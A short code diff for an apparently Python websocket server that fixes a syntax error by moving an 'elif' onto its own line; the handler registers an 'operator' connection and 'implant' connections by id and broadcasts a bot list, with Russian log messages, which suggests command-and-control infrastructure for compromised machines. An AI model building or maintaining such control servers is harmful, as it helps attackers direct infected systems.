@@ -54,7 +54,8 @@ async def websocket_handler(request):
         client_type = initial_msg.get('type')
 
         if client_type == 'operator':
-            OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list() elif client_type == 'implant' and 'id' in initial_msg:
+            OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
+        elif client_type == 'implant' and 'id' in initial_msg:
             client_id = initial_msg.get('id')
             IMPLANTS[client_id] = ws; print(f"[+] Имплант на связи: {client_id}"); await broadcast_bot_list()
         else:
